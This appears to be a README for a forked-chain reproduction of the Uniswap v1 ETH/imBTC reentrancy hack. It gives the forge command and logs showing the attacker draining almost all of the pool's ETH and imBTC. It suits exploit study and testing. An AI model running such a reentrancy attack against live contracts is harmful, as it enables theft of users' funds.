# Uniswap imBTC reentrant hack testing.

## Block Number

9488451

## Victim

uniswap v1 `ETH/imBTC(ERC777)` exchange pool

## Run

```bash
forge script script/Script.s.sol

[⠔] Compiling...
No files changed, compilation skipped
Script ran successfully.
Gas used: 1524702

== Logs ==
  before attacker ETH: 21000000000000000000000
  before attacker imBTC: 0
  before pool ETH: 718529642351924552227
  before pool imBTC: 1959698094
  ----attack----
  after attacker ETH: 21718527331757032010044
  after attacker imBTC: 1940237338
  after pool ETH: 2310594892542183
  after pool imBTC: 19460756
```
